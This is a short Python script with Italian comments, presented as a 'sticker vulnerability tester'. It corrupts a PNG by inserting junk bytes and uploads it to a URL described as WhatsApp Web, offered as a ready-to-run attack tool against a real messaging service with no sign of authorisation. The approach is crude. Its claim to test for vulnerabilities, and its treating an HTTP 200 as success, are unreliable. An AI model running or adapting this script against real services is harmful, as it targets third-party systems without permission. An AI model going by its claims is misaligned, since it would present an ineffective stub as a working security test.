"""
Custom Sticker Vulnerability Tester
Creato da: Jashin L.
"""

import argparse
import requests
from io import BytesIO
from PIL import Image

def create_malformed_sticker():
    try:
        # Crea un'immagine di sticker malformata
        img = Image.new('RGB', (512, 512), color = 'red')
        byte_io = BytesIO()
        img.save(byte_io, 'PNG')
        byte_io.seek(0)
        
        # Manipola i dati binari dell'immagine per creare un pacchetto malformato
        malformed_data = byte_io.getvalue()[:100] + b'corrupted_data' + byte_io.getvalue()[100:]
        
        return malformed_data
    except Exception as e:
        print(f"Errore durante la creazione dello sticker malformato: {e}")
        return None

def send_sticker(url, sticker_data):
    try:
        # Invia il pacchetto di sticker malformato
        files = {'file': ('sticker.png', sticker_data, 'image/png')}
        response = requests.post(url, files=files)
        return response.status_code
    except Exception as e:
        print(f"Errore durante l'invio dello sticker malformato: {e}")
        return None

def main():
    parser = argparse.ArgumentParser(description="Custom Sticker Vulnerability Tester")
    parser.add_argument("--url", required=True, help="URL di WhatsApp Web")
    args = parser.parse_args()
    
    url = args.url
    sticker_data = create_malformed_sticker()
    
    if sticker_data:
        status_code = send_sticker(url, sticker_data)
        if status_code == 200:
            print("Sticker malformato inviato con successo.")
        else:
            print(f"Errore nell'invio dello sticker malformato: {status_code}")
    else:
        print("Non Ã¨ stato possibile creare lo sticker malformato.")

if __name__ == "__main__":
    main()